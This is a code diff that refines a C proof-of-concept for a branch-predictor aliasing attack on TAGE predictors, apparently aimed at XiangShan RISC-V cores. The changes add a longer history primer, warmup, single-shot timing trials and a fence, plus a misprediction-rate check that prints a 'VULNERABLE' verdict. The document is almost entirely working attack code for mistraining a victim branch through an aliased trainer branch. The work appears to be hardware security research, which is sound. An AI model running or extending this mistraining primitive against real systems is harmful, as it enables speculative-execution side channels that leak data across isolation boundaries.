@@ -281,89 +281,202 @@ static inline uint64_t read_cycles(void)
 }
 
 /*
- * Execute a "history primer": 16 always-taken conditional branches that
- * set the lower 8 bits of the global history register to 0xFF (all ones),
- * ensuring a deterministic history value before each training/victim call.
+ * Execute a history primer: 64 always-taken conditional branches.
+ *
+ * 64 branches set the lower 64 bits of the global history register,
+ * covering all four TAGE tables (T1: 8-bit, T2: 13-bit, T3: 32-bit,
+ * T4: 119-bit partially).  Using 64 instead of 16 branches improves
+ * aliasing reliability for T3 (32-bit history) which was unreliable with
+ * the previous 16-branch primer.
  *
  * The volatile prevents the compiler from hoisting or eliminating the
- * branches; __builtin_expect hints guide the branch predictor itself on
- * architectures that honour them, but we deliberately do NOT use it here
- * so the real hardware branch predictor learns from the actual outcomes.
+ * branches; we deliberately omit __builtin_expect so the real hardware
+ * branch predictor learns from the actual execution outcomes.
  */
 static __attribute__((noinline)) void prime_history(void)
 {
     volatile int one = 1;
-    /* 16 always-taken branches to fill the 8-bit history with 1s */
+    /* 64 always-taken branches — covers T1/T2/T3 history lengths fully
+     * and partially covers T4 (119-bit). */
+    if (one) {} if (one) {} if (one) {} if (one) {}
+    if (one) {} if (one) {} if (one) {} if (one) {}
+    if (one) {} if (one) {} if (one) {} if (one) {}
+    if (one) {} if (one) {} if (one) {} if (one) {}
+    if (one) {} if (one) {} if (one) {} if (one) {}
+    if (one) {} if (one) {} if (one) {} if (one) {}
+    if (one) {} if (one) {} if (one) {} if (one) {}
+    if (one) {} if (one) {} if (one) {} if (one) {}
+    if (one) {} if (one) {} if (one) {} if (one) {}
+    if (one) {} if (one) {} if (one) {} if (one) {}
+    if (one) {} if (one) {} if (one) {} if (one) {}
+    if (one) {} if (one) {} if (one) {} if (one) {}
     if (one) {} if (one) {} if (one) {} if (one) {}
     if (one) {} if (one) {} if (one) {} if (one) {}
     if (one) {} if (one) {} if (one) {} if (one) {}
     if (one) {} if (one) {} if (one) {} if (one) {}
 }
 
-#define MEASURE_ROUNDS  2000
-
 /*
- * Measure the average cycle count for calling fn(cond) MEASURE_ROUNDS times.
- * prime_history() is called once before the loop to fix the incoming history.
+ * Training repetitions per trial, total trial count, and warmup depth.
+ *
+ * TRAIN_ITERS  - branches executed as TAKEN per trial to saturate the
+ *                3-bit TAGE counter (max = +3) with high confidence.
+ *                Raised from 500 → 2 000 to improve T3/T4 coverage.
+ *
+ * TRIAL_COUNT  - independent train→measure trials for both the baseline
+ *                and attack phases.  More trials expose the misprediction
+ *                rate distribution better than a single aggregate average.
+ *
+ * WARMUP_ITERS - NOT-TAKEN victim calls before Phase 0 measurement.
+ *                Without this the predictor has no entry at all, so the
+ *                baseline Phase 0 exhibits cold-miss latency identical to
+ *                a misprediction — making both phases look the same.
  */
-static uint64_t measure_avg_cycles(gadget_fn fn, int cond)
+#define TRAIN_ITERS   2000
+#define TRIAL_COUNT    200
+#define WARMUP_ITERS  2000
+
+/*
+ * Warm up the victim branch by calling it NOT-TAKEN `iters` times so
+ * the predictor builds a well-trained NOT-TAKEN entry before any timing
+ * measurement begins.  Without this step Phase 0 measures an untrained
+ * ("cold") predictor whose latency already matches a misprediction,
+ * masking the attack signal.
+ */
+static void warmup_not_taken(gadget_fn fn, int iters)
 {
-    prime_history();
-    volatile int sink = 0;
-    uint64_t start = read_cycles();
-    for (int i = 0; i < MEASURE_ROUNDS; i++)
-        sink += fn(cond);
-    uint64_t end = read_cycles();
-    (void)sink;
-    return (end - start) / MEASURE_ROUNDS;
+    for (int i = 0; i < iters; i++) {
+        prime_history();
+        fn(0 /*not-taken*/);
+    }
 }
 
 /*
- * Full hardware timing attack:
+ * Baseline trial: re-enforce the correct NOT-TAKEN predictor entry by
+ * running the victim NOT-TAKEN `train_n` times, then take a single
+ * cycle-accurate measurement of one more NOT-TAKEN victim call.
  *
- *  Phase 0: baseline  - measure victim NOT-TAKEN (no training)
- *  Phase 1: training  - run trainer TAKEN 500× to saturate the TAGE entry
- *  Phase 2: attack    - measure victim NOT-TAKEN again
+ * Returning the raw elapsed cycles for one call avoids the averaging
+ * artifact in the original measure_avg_cycles() approach: 2 000-round
+ * averaging allowed the predictor to re-learn the correct direction
+ * after the first misprediction, diluting the attack signal.
+ */
+static uint64_t baseline_trial(gadget_fn victim, int train_n)
+{
+    for (int i = 0; i < train_n; i++) {
+        prime_history();
+        victim(0 /*not-taken*/);
+    }
+    prime_history();
+    uint64_t t0 = read_cycles();
+    volatile int r = victim(0 /*not-taken*/);
+    uint64_t t1 = read_cycles();
+    (void)r;
+    return t1 - t0;
+}
+
+/*
+ * Attack trial: train the ALIASED TAGE entry as TAKEN by running the
+ * trainer branch TAKEN `train_n` times, then immediately measure ONE
+ * victim call that should now be mis-predicted TAKEN.
  *
- * A higher cycle count in Phase 2 vs Phase 0 indicates that TAGE now
- * predicts TAKEN for the victim, causing a branch misprediction penalty.
+ * The single-shot approach captures the misprediction before the
+ * predictor can observe the victim's true NOT-TAKEN outcome and self-
+ * correct — which was the main flaw in the original bulk-average method.
+ *
+ * A RISC-V fence is inserted between training and measurement to ensure
+ * all branch-predictor updates are committed before the victim is fetched.
+ */
+static uint64_t attack_trial(gadget_fn trainer, gadget_fn victim, int train_n)
+{
+    for (int i = 0; i < train_n; i++) {
+        prime_history();
+        trainer(1 /*taken*/);
+    }
+#if defined(__riscv)
+    /* Ensure all branch-predictor updates from the training loop are
+     * visible to the front-end before fetching the victim instruction. */
+    __asm__ volatile("fence" ::: "memory");
+#endif
+    prime_history();
+    uint64_t t0 = read_cycles();
+    volatile int r = victim(0 /*not-taken — should be mis-predicted TAKEN*/);
+    uint64_t t1 = read_cycles();
+    (void)r;
+    return t1 - t0;
+}
+
+/*
+ * Full hardware timing attack — revised methodology:
+ *
+ *  Phase 0: Warmup + baseline
+ *    - Run victim NOT-TAKEN WARMUP_ITERS times so the predictor has a
+ *      correct NOT-TAKEN entry before any measurement (critical fix).
+ *    - Collect TRIAL_COUNT baseline_trial() single-shot samples.
+ *
+ *  Phase 1 + 2: Attack
+ *    - Collect TRIAL_COUNT attack_trial() single-shot samples.
+ *    - Each trial freshly trains TAGE via the aliased trainer, then takes
+ *      exactly one victim measurement before the predictor can recover.
+ *
+ *  Evaluation: report min / average / misprediction rate (fraction of
+ *  attack trials exceeding baseline_avg × 1.25).
  */
 static void hardware_timing_attack(gadget_fn trainer, gadget_fn victim,
                                    uint64_t pc_a,     uint64_t pc_b)
 {
     printf("\n[Hardware] Timing-based misprediction measurement\n");
     printf("  Branch offset within page: +%d bytes\n", BRANCH_OFFSET);
-    printf("  Trainer PC = 0x%lx  Victim PC = 0x%lx\n\n",
+    printf("  Trainer PC = 0x%lx  Victim PC = 0x%lx\n",
            (unsigned long)pc_a, (unsigned long)pc_b);
+    printf("  Train iters per trial = %d  |  Trials = %d\n\n",
+           TRAIN_ITERS, TRIAL_COUNT);
 
-    /* Phase 0: baseline (no predictor training at pc_a yet) */
-    uint64_t base = measure_avg_cycles(victim, 0 /*not-taken cond*/);
-    printf("  Phase 0 (baseline, victim NOT-TAKEN, no training): %lu cycles\n",
-           (unsigned long)base);
+    /* Phase 0: seed the predictor with correct NOT-TAKEN before baseline */
+    warmup_not_taken(victim, WARMUP_ITERS);
 
-    /* Phase 1: training - execute trainer as TAKEN 500 times */
-    prime_history();
-    for (int i = 0; i < 500; i++) {
-        prime_history();
-        trainer(1 /*taken*/);
+    uint64_t base_min = UINT64_MAX, base_sum = 0;
+    for (int t = 0; t < TRIAL_COUNT; t++) {
+        uint64_t d = baseline_trial(victim, TRAIN_ITERS);
+        if (d < base_min) base_min = d;
+        base_sum += d;
     }
-    printf("  Phase 1: trained TAKEN 500× at trainer address.\n");
+    uint64_t base_avg = base_sum / TRIAL_COUNT;
+    printf("  Phase 0 (baseline, victim NOT-TAKEN, no cross-training):\n");
+    printf("    min = %lu cycles,  avg = %lu cycles\n\n",
+           (unsigned long)base_min, (unsigned long)base_avg);
 
-    /* Phase 2: attack measurement */
-    uint64_t attack = measure_avg_cycles(victim, 0 /*not-taken cond*/);
-    printf("  Phase 2 (attack,   victim NOT-TAKEN, after training): %lu cycles\n",
-           (unsigned long)attack);
+    /* Phase 1: train via aliasing; Phase 2: single-shot measurement */
+    printf("  Phase 1: training TAKEN %d× per trial at trainer address.\n",
+           TRAIN_ITERS);
+    uint64_t atk_min = UINT64_MAX, atk_sum = 0;
+    int mispred_count = 0;
+    uint64_t threshold = base_avg + base_avg / 4; /* base_avg × 1.25 */
+    for (int t = 0; t < TRIAL_COUNT; t++) {
+        uint64_t d = attack_trial(trainer, victim, TRAIN_ITERS);
+        if (d < atk_min) atk_min = d;
+        atk_sum += d;
+        if (d > threshold) mispred_count++;
+    }
+    uint64_t atk_avg = atk_sum / TRIAL_COUNT;
+    printf("  Phase 2 (attack, victim NOT-TAKEN, immediately after training):\n");
+    printf("    min = %lu cycles,  avg = %lu cycles\n",
+           (unsigned long)atk_min, (unsigned long)atk_avg);
+    printf("    Trials with significant overhead (>25%% above baseline): "
+           "%d / %d  (%.1f%%)\n",
+           mispred_count, TRIAL_COUNT,
+           100.0 * mispred_count / TRIAL_COUNT);
 
     /* Evaluation */
     double overhead = 0.0;
-    if (base > 0)
-        overhead = 100.0 * ((double)attack - (double)base) / (double)base;
+    if (base_avg > 0)
+        overhead = 100.0 * ((double)atk_avg - (double)base_avg) / (double)base_avg;
 
-    printf("\n  Timing overhead: %.1f%%\n", overhead);
-    if (overhead > 15.0) {
-        printf("  [RESULT] VULNERABLE - %.1f%% slowdown indicates branch\n"
-               "           misprediction caused by predictor aliasing.\n",
-               overhead);
+    printf("\n  Timing overhead (avg): %.1f%%\n", overhead);
+    if (overhead > 15.0 || mispred_count > TRIAL_COUNT / 10) {
+        printf("  [RESULT] VULNERABLE -- %.1f%% average slowdown / %d misprediction\n"
+               "           events indicate branch predictor aliasing is active.\n",
+               overhead, mispred_count);
     } else {
         printf("  [RESULT] No significant overhead measured on this host.\n"
                "           Run on XiangShan hardware for definitive results.\n");
@@ -530,7 +643,7 @@ int main(void)
     /* ------------------------------------------------------------------
      * Step 3: Simulate the full training → attack cycle in software.
      * ------------------------------------------------------------------ */
-    int sim_result = simulate_attack(pc_a, pc_b, fixed_history, 500);
+    int sim_result = simulate_attack(pc_a, pc_b, fixed_history, TRAIN_ITERS);
     if (sim_result == 1)
         printf("  [OK] Software simulation confirms: victim is predicted TAKEN "
                "after training at trainer address.\n");
